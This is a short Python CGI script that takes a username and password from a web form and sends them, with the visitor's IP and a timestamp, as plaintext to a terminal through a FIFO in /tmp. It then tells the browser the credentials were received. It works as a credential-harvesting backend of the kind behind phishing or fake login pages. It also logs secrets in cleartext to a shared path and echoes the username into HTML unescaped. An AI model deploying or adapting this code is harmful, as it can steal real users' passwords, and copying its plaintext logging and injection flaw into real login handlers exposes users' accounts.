#!/usr/bin/env python3
import cgi, os, time

form = cgi.FieldStorage()
username = form.getfirst("username", "")
password = form.getfirst("password", "")
remote = os.environ.get("REMOTE_ADDR", "-")
ts = time.strftime("%Y-%m-%d %H:%M:%S")

# Send to terminal via FIFO
fifo = "/tmp/login_fifo"
msg = f"{ts} | IP={remote} | USERNAME={username} | PASSWORD={password}\n"
try:
    with open(fifo, "w") as f:
        f.write(msg)
except:
    pass

# Reply to browser
print("Content-Type: text/html\n")
print(f"""
<!doctype html>
<html><body>
<h2>Thanks {username}</h2>
<p>Your credentials were received.</p>
<a href="/index.html">Back</a>
</body></html>
""")
